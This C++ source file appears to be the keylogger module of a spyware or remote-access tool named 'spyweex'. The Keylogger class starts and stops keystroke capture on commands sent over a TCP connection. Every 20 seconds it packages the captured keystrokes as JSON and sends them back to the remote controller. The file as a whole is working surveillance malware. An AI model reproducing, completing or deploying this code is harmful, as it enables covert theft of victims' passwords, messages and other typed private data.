
#include "keyboard_logger.hpp"
#include "utils.hpp"
#include "spyweex.h"
#include <fstream>
#include "mime_types.hpp"

namespace http
{
	namespace server
	{

		Keylogger::Keylogger(ip::tcp::socket& sock, io_service& io_ref) :
			TaskHandlerInterface(sock, io_ref), keylog_report_timer(io_ref)
		{
			operations_queue_ptr = async_op::new_();
		}

		void Keylogger::start()
		{
			SendMessage(get_window_hWnd(), WM_START_KEYLOGGER, 0, 0);
			isStarted = true;
			listen_for_report_data();
		}

		void Keylogger::stop()
		{
			SendMessage(get_window_hWnd(), WM_STOP_KEYLOGGER, 0, 0);
			isStarted = false;
		}

		void Keylogger::listen_for_report_data()
		{
			keylog_report_timer.expires_from_now(boost::posix_time::seconds(20));
			keylog_report_timer.async_wait(boost::bind(&Keylogger::on_keylog_report_timer_elapsed, this, _1));
		}

		void Keylogger::on_keylog_report_timer_elapsed(const boost::system::error_code& error)
		{
			// if operation was aborted while timer was in async_wait state
			// then it should send one last response to the caller
			// and do not invoke the timer anymore cancel the timer
			Hardware& keyboard_hardware = get_keyboard_hardware_instance();
			std::string utf8_encoded_string = keyboard_hardware.get_timed_report();
			_reply_buffer_ptr.reset(new reply());
			
			std::string extension = "json";

			// Fill out the reply to be sent to the client.
			_reply_buffer_ptr->status_line = http::server::status_strings::ok;
			if(keyboard_hardware.isLastReport())
				_reply_buffer_ptr->status_line.append(" ").append(wxhtpconstants::ACTION_TYPE::KEYLOGGER_STOP).append("\r\n");
			else
				_reply_buffer_ptr->status_line.append(" ").append(wxhtpconstants::ACTION_TYPE::KEYLOGGER_REPORT).append("\r\n");

			_reply_buffer_ptr->content.append(utf8_encoded_string);

			_reply_buffer_ptr->headers.resize(3);
			_reply_buffer_ptr->headers[0].name = "Tag";
			_reply_buffer_ptr->headers[0].value = std::string(_request_buffer_ptr->dictionary_headers.at("Tag"));
			_reply_buffer_ptr->headers[1].name = "Content-Type";
			_reply_buffer_ptr->headers[1].value = mime_types::extension_to_type(extension);
			_reply_buffer_ptr->headers[2].name = "Content-Length";
			_reply_buffer_ptr->headers[2].value = std::to_string(_reply_buffer_ptr->content.size());

			async_write(socket_,
				_reply_buffer_ptr->to_buffers(),
				boost::bind(&Keylogger::handle_async_write_report,
					this,
					boost::asio::placeholders::error,
					boost::asio::placeholders::bytes_transferred)
				);
		}

		void Keylogger::handle_async_write_report(const boost::system::error_code& error, std::size_t bytes)
		{
			if( error != error::operation_aborted)
			{
				if(isStarted)
					listen_for_report_data();
				else
				{
					_reply_buffer_ptr.reset();
				}
			}
		}

		bool Keylogger::execute(std::shared_ptr<request> req, std::shared_ptr<reply> rep)
		{
			if (req->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_START)
				&& req->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_STOP))
			{
				return false;
			}
			
			_request_buffer_ptr.swap(req);
			if (_request_buffer_ptr->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_START) == 0)
			{
				if(!isStarted)
				{
					start();
				}
			}
			if (_request_buffer_ptr->action_type.compare(wxhtpconstants::ACTION_TYPE::KEYLOGGER_STOP) == 0)
			{
				if(isStarted)
				{
					stop();
				}
			}

			return true;
		}
	}
}
